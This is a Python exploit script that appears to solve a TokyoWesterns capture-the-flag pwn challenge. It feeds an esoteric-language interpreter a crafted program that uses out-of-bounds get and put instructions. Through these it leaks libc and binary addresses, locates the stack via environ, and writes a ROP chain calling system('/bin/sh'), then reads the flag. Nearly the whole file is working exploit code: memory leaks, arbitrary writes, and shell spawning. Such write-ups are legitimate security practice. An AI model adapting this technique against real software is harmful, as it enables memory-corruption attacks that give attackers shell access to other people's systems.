#!/usr/bin/env python2.7

import socket
import struct
import sys
import telnetlib

if len(sys.argv) == 3:
    ADDR = sys.argv[1]
    PORT = int(sys.argv[2])
else:
    ADDR = "pwn1.chal.ctf.westerns.tokyo"
    PORT = 62839

DBG = False

s = socket.create_connection((ADDR, PORT))

def p64(a):
    return struct.pack("<Q", a)

def u64(s):
    return struct.unpack("<Q", s)[0]

def p32(a):
    return struct.pack("<I", a)

def u32(s):
    return struct.unpack("<I", s)[0]

def rtil(st):
    buf = ""
    x = 0
    while True:
        curr = s.recv(1)
        if curr == "":
            break
        buf += curr
        if(curr == st[x]):
            x += 1
            if x == len(st):
                break
        else:
            x = 0
    if DBG:
        sys.stdout.write(buf)
        sys.stdout.flush()
    return buf



rtil("> ")

##################################
# Program part
#################################

prog = ''

##############################
# leak address of environ@libc
prog += "&&g." * 8

#########################
# leak address of 'progam'
prog += "&&g." * 8
prog = prog.ljust(78, ' ')
prog += "v"                     # go 'down' to next line
prog = prog.ljust(82, "Z")

#####################
# read stack pointer
# through environ
prog += "&&*&+&g." * 8
prog = prog.ljust(158, ' ')
prog += "v>"                    # go right to "loop around", then go down
prog = prog.ljust(164, ' ')

###################################
# this part of the program infinite 
# loops and reads the ropchain to
# the stack
prog += "&&&*&+&p" * 8
prog = prog.ljust(164 + 74, ' ')
prog += " >"                   # go right to "loop around" forever
prog = prog.ljust(164 + 82, ' ')

prog += "/bin/sh\x00"           # arg to system() somwhere on the 'program'
prog = prog.ljust(2050, ' ')
s.send(prog)
rtil("> " * 24)


###################################
# I/O part
###################################


##############################
# leak address of environ@libc
off_to_got = -200
for i in range(8):
    s.send(str(off_to_got + i) + "\n")
    s.send(str(0) + "\n")

#########################
# leak address of 'progam'
off_to_prog = -96
for i in range(8):
    s.send(str(off_to_prog + i) + "\n")
    s.send(str(0) + "\n")

##############################
# leak address of environ@libc
lk = ""
for i in range(8):
    lk += rtil(" ")

lki = lk.split(" ")
lki = lki[0:8]
lk = 0
for i in range(len(lki)):
    if lki[i] != '':
        val = int(lki[i])
        lk = lk | (val & 0xff)<< i * 8

fgets = lk
offset_to_base = - 0x6e160
offset_to_sys = 0x46590
lc_off_to_env = 0x3c14a0

lc_base = fgets + offset_to_base
system = lc_base + offset_to_sys
environ = lc_base + lc_off_to_env

print "address of environ: %s"%hex(environ)


###########################
# leak address of 'program'
lk = ""
for i in range(8):
    lk += rtil(" ")

lki = lk.split(" ")
lki = lki[0:8]
lk = 0
for i in range(len(lki)):
    if lki[i] != '':
        val = int(lki[i])
        lk = lk | (val & 0xff)<< i * 8

prog = lk
text_base = prog - 0x202040
prdi = text_base + 0x1273
print "address of 'program': %s"%hex(prog)
print "address of .text: %s"%hex(text_base)

off_to_env = environ - prog
print "offset to environ: %s"%hex(off_to_env)

#####################
# read stack pointer
# through environ
for i in range(8):
    # we break it up
    val = off_to_env + i
    divver = 0x100000
    lower = val & 0xfffff
    upper = val / divver
    # upper * 0x100000 + lower
    s.send(str(divver) + "\n")
    s.send(str(upper) + "\n")
    s.send(str(lower) + "\n")

    # the zero
    s.send(str(0) + "\n")

lk = ""
for i in range(8):
    lk += rtil(" ")

lki = lk.split(" ")
lki = lki[0:8]
lk = 0
for i in range(len(lki)):
    if lki[i] != '':
        val = int(lki[i])
        lk = lk | (val & 0xff)<< i * 8

stack_ptr = lk
stack_target = stack_ptr - 0xf0
off_to_stack = stack_target - prog
print "stack pointer: %s"%hex(lk)
print "offset to return address: %s"%(hex(off_to_stack))

# ropchain 
prdir = p64(prdi)
rdir = p64(text_base + 0x202138)
systemr = p64(system)

ropchain = [prdir, rdir, systemr]

# we need to break the target
# into multipl operations because
# we can't just push a QWORD to the
# interpreter's stack
for ggt in ropchain:
    for j in range(8):
        dest = off_to_stack + j
        divver = 0x100000
        lower = dest & 0xfffff
        upper = dest / divver

        # the value
        s.send(str(ord(ggt[j])) + "\n")

        # dest = upper * 0x100000 + lower
        s.send(str(divver) + "\n")
        s.send(str(upper) + "\n")
        s.send(str(lower) + "\n")

        # the zero
        s.send(str(0) + "\n")
    off_to_stack += 8

# make it terminate due to infinite loop
# by sending invalid input
s.send("asdf\n")
rtil("?\n")
s.send("cat flag\n")
print rtil("}")
